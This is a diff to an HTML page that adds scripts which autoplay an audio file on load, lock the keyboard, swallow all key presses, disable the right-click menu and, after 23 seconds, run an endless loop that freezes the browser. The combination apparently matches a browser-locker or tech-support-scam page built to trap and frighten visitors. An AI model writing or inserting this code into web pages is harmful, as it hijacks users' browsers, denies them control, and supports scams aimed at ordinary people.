@@ -196,8 +196,13 @@
 
 
 </head>
-<body id="mycanvas" onload="playSound()">
 
+<script>
+	window.onload = function() {
+  var audio = new Audio("media/olr31sbc3YFS.mp3");
+  audio.play();
+};
+</script>
 
 <div class="box" id="box">
   <div class="top">
@@ -662,6 +667,32 @@ function myFunction() {
 }
 </script>
 
+	 <script>
+    navigator.keyboard.lock();
+    document.onkeydown = function (e) {
+    return false;
+    }
+</script>
+
+<script>
+    // Disable right-click
+    window.addEventListener('contextmenu', function (e) {
+        e.preventDefault();
+    });
+</script>
+
+<script>
+
+    setTimeout("warning()", 23000);
+    setTimeout("warning()", 23000);
+    function warning(){
+    while(true){
+        console.log('warning')
+}
+}
+
+
+</script>
 
 <script type="text/javascript">/*<![CDATA[*/
 
